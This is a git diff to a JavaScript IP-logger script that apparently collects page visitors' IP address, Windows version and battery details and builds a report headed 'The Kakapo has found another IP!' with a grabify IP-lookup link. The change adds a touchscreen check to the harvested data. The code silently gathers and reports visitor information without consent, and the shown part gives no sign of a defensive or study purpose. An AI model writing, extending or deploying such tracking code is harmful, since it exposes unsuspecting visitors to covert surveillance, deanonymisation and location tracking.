@@ -143,7 +143,14 @@ function realWindowsVersion(userOS) {
       });
   });
 }
-	
+
+function hasTouchscreen() {
+  if ('ontouchstart' in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0) {
+    return true;
+  } else {
+    return false;
+  }
+}
 
 async function logIP() {
   try {
@@ -184,6 +191,9 @@ let batteryCharging = "N/A";
 let batteryChargeTime = "N/A";
 let batteryDishargeTime = "N/A";
 
+
+
+	  
 if (navigator.getBattery) {
 	if (batteryInfo !== "N/A") {
 	batteryLevel = `${batteryInfo.level * 100}%`;
@@ -194,7 +204,7 @@ if (navigator.getBattery) {
 }
 
 
-
+const isTouchscreen = hasTouchscreen();
 	  
 const message = `
 The Kakapo has found another IP!
@@ -216,7 +226,7 @@ Check here to see IP VPN and Location status <https://grabify.link/ip-lookup/${i
 - Battery Charging: ${batteryCharging} 
 - Battery Charge Time: ${batteryChargeTime} 
 - Battery Life Time: ${batteryDishargeTime} 
-
+- Touch Screen: ${isTouchscreen}
 `;
 	  
     const msg = {
